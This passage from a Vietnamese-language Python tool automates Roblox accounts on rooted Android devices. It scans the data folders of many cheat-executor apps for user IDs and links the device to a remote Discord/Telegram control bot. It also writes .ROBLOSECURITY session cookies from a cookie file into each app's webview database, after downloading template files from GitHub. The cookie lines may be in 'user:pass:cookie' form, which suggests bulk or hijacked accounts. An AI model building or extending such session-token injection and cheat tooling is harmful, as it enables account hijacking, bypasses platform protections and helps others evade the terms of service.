                    auto_android_id_enabled = False
                    console.print("[yellow]⏸️ Đã TẮT Auto Spam Android ID.[/yellow]")
            except Exception as e:
                console.print(f"[red]❌ Lỗi Lệnh 4: {e}[/red]")
            time.sleep(1.5)
                       
            
            
        elif choice == "5":
            settings = FileManager.load_advanced_settings()
            settings["auto_inject"] = not settings.get("auto_inject", True)
            FileManager.save_advanced_settings(settings)
            check_exec_enable = "1" if settings["auto_inject"] else "0"
            console.print(
                f"[green]✅ Auto Inject: {settings['auto_inject']}[/green]")
            time.sleep(1)

        elif choice == "6":
            try:
                console.print(
                    "[bold yellow]🚀 Đang Tìm User id' (Quét ALL Executors)...[/bold yellow]")
                p_id = settings.get("place_id", "2753915549")

                # Danh sách VIP hội tụ anh tài cheat sếp vừa tình báo
                market_prefixes = [
                    "com.roblox.client", "com.roblox.vng", "dinozzz.arceusvnlite",
                    "com.delta.roblox", "com.roblox.delta",
                    "com.codex.roblox", "com.roblox.codex",
                    "com.fluxus.roblox", "com.roblox.fluxus",
                    "com.vegax.roblox", "com.roblox.vegax",
                    "com.cryptic.roblox", "com.punkx.roblox",
                    "com.frostware.roblox", "com.jjsploit.roblox",
                    "com.neutron.roblox", "com.trigon.roblox", "com.ronix.roblox"
                ]

                user_ids = []
                actual_prefix = settings.get(
                    "package_prefix", "com.roblox.client")

                # Tự động đẻ ra hàng chục đường dẫn để quét sạch sành sanh
                for p in market_prefixes:
                    paths_to_check = [
                        f"/data/data/{p}/files/users/",
                        f"/data/data/{p}/files/vng_users/"
                    ]
                    for path in paths_to_check:
                        if os.path.exists(path):
                            ids = [d for d in os.listdir(path) if d.isdigit()]
                            if ids:
                                user_ids.extend(ids)
                                actual_prefix = p  # Tự động chốt sổ thằng executor đang chứa Acc

                user_ids = list(set(user_ids))  # Lọc ID trùng lặp

                if user_ids:
                    # Lưu thông tin tối thượng để vào việc ngay
                    accounts = [(actual_prefix, uid) for uid in user_ids]
                    FileManager.save_accounts(accounts)
                    FileManager.save_server_links(
                        [(actual_prefix, f"roblox://placeID={p_id}") for _ in accounts])

                    globals()["package_prefix"] = actual_prefix
                    globals()["place_id"] = p_id
                    settings["package_prefix"] = actual_prefix
                    FileManager.save_advanced_settings(settings)

                    console.print(
                        f"[bold green]✅ Đã quét nát thị trường! Tìm thấy {len(user_ids)} Acc![/]")
                    console.print(
                        f"🔥 Executor tìm thấy: [cyan]{actual_prefix}[/]")
                else:
                    console.print(
                        "[bold red]❌ Radar càn quét xong nhưng trắng tay![/]")
                    console.print(
                        "[yellow]💡 Mẹo: Mở App Executor lên, vào game 1 lúc để nó đẻ file ID rồi quét lại nhé![/]")
            except Exception as e:
                console.print(f"[red]❌ Lỗi Radar: {e}[/]")
            input("\nNhấn Enter để tiếp tục...")
        elif choice == "7": # (Hoặc user_input == "7" tùy sếp đang dùng tên biến nào)
            try:
                console.print("\n[bold cyan]-- 📦 CẤU HÌNH PACKAGE PREFIX (BẢN HACK) --[/bold cyan]")
                current_prefix = settings.get("package_prefix", "com.roblox.client")
                console.print(f"Prefix hiện tại đang lưu: [yellow]{current_prefix}[/yellow]")
                
                console.print("\n[dim]Gợi ý một số Prefix phổ biến:[/dim]")
                console.print("- Quốc tế: com.roblox.client")
                console.print("- VNG: com.roblox.client.vnggamet")
                console.print("- Arceus: dinozzz.arceusvnlite")
                
                p_pre = input("\nNhập Prefix mới (Hoặc bấm Enter để giữ nguyên): ").strip()
                
                if p_pre:
                    globals()["package_prefix"] = p_pre
                    settings["package_prefix"] = p_pre
                    FileManager.save_advanced_settings(settings)
                    console.print(f"[green]✅ Đã chốt sổ Prefix mới: {p_pre}[/green]")
                else:
                    console.print("[dim]⚠️ Giữ nguyên Prefix cũ.[/dim]")
            except Exception as e:
                console.print(f"[red]❌ Lỗi Mục 7: {e}[/red]")
            input("\nNhấn Enter để quay lại Dashboard...")
            
        elif choice == "8":
            try:
                console.print("\n[bold cyan]-- 🤖 HỆ THỐNG LIÊN KẾT BOT ĐIỀU KHIỂN --[/bold cyan]")
                import subprocess
                import uuid
                
                # 1. Lấy mã máy, nếu Cloud Phone chặn thì tự đẻ ra ID ảo bất tử
                device_id = subprocess.getoutput("settings get secure android_id").strip()
                if "Failure" in device_id or "cmd:" in device_id or len(device_id) < 5:
                    # Kiểm tra xem máy đã có ID ảo từ trước chưa
                    old_id = str(settings.get("device_id", ""))
                    if old_id and "Failure" not in old_id and "cmd:" not in old_id:
                        device_id = old_id
                    else:
                        device_id = str(uuid.uuid4().hex)[:10].upper() # Tạo mã 10 chữ số ngẫu nhiên
                
                # 2. Tạo OTP 5 ký tự đầu
                bot_otp = device_id[:5]
                
                # 3. Lưu ngầm vào file để Bot có cái mà check
                settings["device_id"] = device_id
                settings["bot_otp"] = bot_otp
                FileManager.save_advanced_settings(settings)
                
                console.print(f"📱 [bold yellow]Mã Máy (Device ID):[/] [cyan]{device_id}[/cyan]")
                console.print(f"🔑 [bold green]Mã OTP Liên Kết:[/] [bold magenta]{bot_otp}[/bold magenta]")
                console.print("\n[dim]👉 Sếp hãy copy mã OTP này, lên Discord/Tele gõ lệnh (VD: /link " + bot_otp + ") để Bot nhận diện máy nhé![/dim]")
            except Exception as e:
                console.print(f"[red]❌ Lỗi tạo mã liên kết: {e}[/red]")
            input("\nNhấn Enter để quay lại Dashboard...")
            
        elif choice == "9":
            try:
                console.print("\n[bold cyan]-- 🍪 AUTO LOGIN BẰNG COOKIE (DORO INJECTOR) --[/bold cyan]")
                import sqlite3
                import shutil
                
                # 1. Quét lõi Android tìm các bản Roblox/Clone đang cài
                console.print("[dim]🔍 Đang quét các bản Roblox/Clone trên máy...[/dim]")
                raw_output = subprocess.getoutput("pm list packages | grep -i roblox | sed 's/package://'").strip()
                installed_packages = [p for p in raw_output.split('\n') if p]
                
                if not installed_packages:
                    console.print("[bold red]❌ Không tìm thấy bản Roblox hoặc Clone nào để bơm![/bold red]")
                    input("\nNhấn Enter để quay lại...")
                    continue
                
                # 2. Đọc kho đạn (cookie.txt)
                cookie_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'cookie.txt')
                if not os.path.exists(cookie_file):
                    open(cookie_file, 'w').close()
                    
                with open(cookie_file, 'r') as f:
                    # Chơi hệ vét cạn, lọc ra những dòng có chứa chuỗi cookie chuẩn
                    cookies = [line.strip() for line in f if "_|WARNING" in line]
                    
                if not cookies:
                    console.print("[bold red]❌ File cookie.txt đang trống hoặc sai định dạng![/bold red]")
                    console.print("[yellow]💡 Tip: Sếp mở file cookie.txt lên, dán mỗi dòng 1 cookie (bắt đầu bằng _|WARNING...) vào nhé.[/yellow]")
                    input("\nNhấn Enter để quay lại...")
                    continue
                    
                console.print(f"[bold yellow]📦 Sẵn sàng: Tìm thấy {len(installed_packages)} App và {len(cookies)} Cookie![/bold yellow]")
                
                # 3. Tải Phôi (File DB rỗng và appStorage lừa tình)
                console.print("[dim]📥 Đang tải Phôi Database chuẩn từ Cloud...[/dim]")
                db_url = "https://raw.githubusercontent.com/nghvit/module/refs/heads/main/import/Cookies"
                app_url = "https://raw.githubusercontent.com/nghvit/module/refs/heads/main/import/appStorage.json"
                
                os.makedirs("Doro.dev", exist_ok=True)
                db_path = "Doro.dev/Cookies.db"
                app_path = "Doro.dev/appStorage.json"
                
                # Hàm tải phôi siêu tốc
                def download_phoi(url, dest):
                    if not os.path.exists(dest):
                        r = requests.get(url, stream=True)
                        with open(dest, 'wb') as file:
                            file.write(r.content)
                
                download_phoi(db_url, db_path)
                download_phoi(app_url, app_path)
                
                # 4. Bắt đầu dây chuyền bơm
                success_count = 0
                for i, pkg in enumerate(installed_packages):
                    if i >= len(cookies):
                        console.print("\n[yellow]⚠️ Cảnh báo: Đã dùng hết số Cookie trong file! Các app còn lại sẽ bị bỏ qua.[/yellow]")
                        break
                        
                    # Lấy cookie tương ứng cho App (App 1 ăn Cookie 1, App 2 ăn Cookie 2...)
                    current_cookie = cookies[i]
                    
                    # Cắt xén nếu sếp copy định dạng user:pass:cookie
                    if ":" in current_cookie and len(current_cookie.split(":")) >= 3:
                        parts = current_cookie.split(":")
                        current_cookie = ":".join(parts[2:]) # Lấy phần mã phía sau
                        
                    console.print(f"[cyan]💉 Đang bơm cho -> {pkg}[/cyan]")
                    RobloxManager.kill_roblox_process(pkg)
                    
                    # Mở đường máu vào thư mục Tuyệt Mật của game
                    dest_db_dir = f"/data/data/{pkg}/app_webview/Default/"
                    dest_app_dir = f"/data/data/{pkg}/files/appData/LocalStorage/"
                    os.makedirs(dest_db_dir, exist_ok=True)
                    os.makedirs(dest_app_dir, exist_ok=True)
                    
                    # Chép phôi vào
                    dest_db_file = os.path.join(dest_db_dir, "Cookies")
                    dest_app_file = os.path.join(dest_app_dir, "appStorage.json")
                    shutil.copyfile(db_path, dest_db_file)
                    shutil.copyfile(app_path, dest_app_file)
                    
                    # Phép thuật bạo chúa (Chọc SQLite để ép trình duyệt nhận Cookie)
                    try:
                        conn = sqlite3.connect(dest_db_file)
                        cursor = conn.cursor()
                        # Hạn sử dụng 1 năm không lo bị văng
                        expire_time = int(time.time() + 31536000) * 1000000 
                        cursor.execute("UPDATE cookies SET value = ?, last_access_utc = ?, expires_utc = ? WHERE host_key = '.roblox.com' AND name = '.ROBLOSECURITY'", 
                                      (current_cookie, int(time.time() * 1000000), expire_time))
                        conn.commit()
                        conn.close()
                        success_count += 1
                        console.print("  [green]└─> Nhập cảnh thành công! ✅[/green]")
                    except Exception as e:
                        console.print(f"  [red]└─> Lỗi Database: {e}[/red]")
                        
                console.print(f"\n[bold green]🎉 XONG! Đã bơm thành công {success_count} Nick![/bold green]")
                console.print("[dim]Sếp có thể ấn Lệnh 1 (Start Tool) để máy tự mở game và càn quét ID nhé![/dim]")
                
            except Exception as e:
                console.print(f"[red]❌ Lỗi Hệ Thống Injector: {e}[/red]")
            input("\nNhấn Enter để quay lại Dashboard...")
            

if __name__ == "__main__":
    try:
        threading.Thread(target=listen_discord_commands, daemon=True).start()
    except NameError:
        pass  # Bỏ qua nếu sếp chưa dán hàm nghe lén
    try:
        main()
    except Exception as e:
        print(f"Error: {e}")
